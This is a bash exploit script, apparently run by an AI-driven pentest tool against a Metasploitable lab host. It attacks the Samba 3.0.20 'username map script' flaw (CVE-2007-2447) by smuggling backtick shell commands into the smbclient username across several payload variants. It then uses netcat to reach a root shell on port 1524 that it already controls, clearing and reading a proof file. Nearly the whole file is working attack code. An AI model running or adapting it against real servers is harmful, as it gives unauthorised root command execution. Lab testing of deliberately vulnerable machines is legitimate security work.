#!/usr/bin/env bash
# Metasploitable: Samba 3.0.20 "username map script" RCE (CVE-2007-2447).
# Vulnerable directive confirmed present: `username map script` in smb.conf.
# Samba runs the map script via /bin/sh WITHOUT sanitising the username, so
# backticks in the SMB username execute as root. We try several smbclient payload
# variants, then verify through the 1524 root shell (not the guest share) whether
# the injected proof file was written.
set -uo pipefail
OUT="/opt/argus-ai/gemini-scans/metasploitable/03-samba-rce.txt"
MARK="argus_smb_rce"
CMD="id > /tmp/${MARK} 2>&1; uname -a >> /tmp/${MARK} 2>&1; hostname >> /tmp/${MARK} 2>&1"
SMBX=(-m NT1 --option='client min protocol=NT1')

fire() {  # $1=share  $2=prefix  $3=wrap(nohup|"")
  timeout 15 smbclient "//target-m/$1" "${SMBX[@]}" \
    -U "$2\`$3 sh -c '$CMD'\`%" -c 'exit' >/dev/null 2>&1 || true
}

{
  echo "### Samba usermap_script RCE (CVE-2007-2447) on target-m ###"
  echo "### vulnerable directive confirmed: username map script in smb.conf ###"
  echo
  # clear any stale proof file first (via the root shell we already own)
  printf 'rm -f /tmp/%s; exit\n' "$MARK" | nc -w 4 target-m 1524 >/dev/null 2>&1 || true

  echo "[*] Trying smbclient payload variants (share x prefix x nohup)..."
  for share in tmp IPC\$; do
    for pre in "./=" "/="; do
      for wrap in "nohup" ""; do
        fire "$share" "$pre" "$wrap"
      done
    done
  done
  sleep 2

  echo
  echo "[*] Verifying via the 1524 root shell whether the injection ran:"
  echo "-----------------------------------------------------------------"
  printf 'echo ---PROOF---; cat /tmp/%s 2>/dev/null || echo INJECTION_DID_NOT_RUN; echo ---MAPSCRIPT---; cat /etc/samba/scripts/mapusers.sh 2>/dev/null; exit\n' "$MARK" \
    | nc -w 6 target-m 1524
  echo "-----------------------------------------------------------------"
} 2>&1 | tee "$OUT"
